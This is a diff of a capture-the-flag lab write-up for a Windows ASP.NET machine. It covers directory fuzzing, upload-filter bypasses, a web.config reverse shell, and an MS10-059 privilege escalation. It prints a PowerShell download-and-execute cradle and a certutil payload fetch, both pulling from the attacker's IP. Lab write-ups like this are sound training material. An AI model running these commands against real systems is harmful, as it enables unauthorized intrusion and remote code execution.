@@ -19,33 +19,46 @@ PORT   STATE SERVICE VERSION
 Looking at the responses from the server in burb shows us this site is most likely running ASP
 
 ![](Images/Pasted%20image%2020250417104923.png)
+
 So we can tie that into our enumeration for Fuzzing
 `ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.30.81:80/FUZZ`
 
 ![](Images/Pasted%20image%2020250417105236.png)
+
 `ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.30.81:80/FUZZ.aspx
 `
 ![](Images/Pasted%20image%2020250417105255.png)
+
 ![](Images/Pasted%20image%2020250417105749.png)
+
 ## Exploit
 
 The transfer file appears to be a file upload and the files are sent to the uploaded files. Lets first see if we can get a simple aspx webshell. It ends up erroring out which probably means we have some sort of filtering on the upload
+
 ![](Images/Pasted%20image%2020250417105828.png)
+
 Lets see if we can modify the request to test extensions using intruder.
 Nothing seemed to have gotten really anywhere with the basic, but I was using a bad payload. The website allows uploads of jpg files.
 
 ![](Images/Pasted%20image%2020250417111109.png)
+
 ![](Images/Pasted%20image%2020250417110545.png)
 
 ![](Images/Pasted%20image%2020250417111140.png)
 
 Using this we can attempt to trick the filter into letting us through with methods such as double extensions.
+
 ![](Images/Pasted%20image%2020250417110707.png)
 ![](Images/Pasted%20image%2020250417110713.png)
+
 Navigating to cmdasp.aspx.jpg didn't get us execution, so maybe we need to use a nullbyte in order to store it as a aspx file while passing the whitelist as jpg. 
+
 ![](Images/Pasted%20image%2020250417111533.png)
+
 Since that didn't work I went back to enumerating and found a list of asp extensions and used that for intruder, and made sure to disable URL encoding.
+
 ![](Images/Pasted%20image%2020250417112714.png)
+
 We find another allowed upload is a .config file.
 Upon a quick google search we find ASP.NET config file is web.config. [Web.Config Reverse Shell](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config)
 We will have to do some modifications to this to get a shell.
@@ -55,10 +68,13 @@ We will need to add the commands to run the reverse shell.
 the config file will not look like this
 `obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.251/shell.ps1')")`
 If everything goes right we pop a shell as user merlin
+
 ![](Images/Pasted%20image%2020250417115051.png)
+
 Grab the user flag and keep moving forward.
 
 ![](Images/Pasted%20image%2020250417115409.png)
+
 ## Priv Esc
 Sysinfo
 ```
@@ -134,9 +150,15 @@ Network Card(s):           1 NIC(s) Installed.
 ```
 
 **MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important**
+
 ![](Images/Pasted%20image%2020250417120256.png)
+
 `certutil -urlcache -split -f http://10.10.14.251:8080/exploit.exe exploit.exe`
+
 ![](Images/Pasted%20image%2020250417120429.png)
+
 `.\exploit.exe 10.10.14.251 4445`
+
 ![](Images/Pasted%20image%2020250417120716.png)
+
 ![](Images/Pasted%20image%2020250417120723.png)
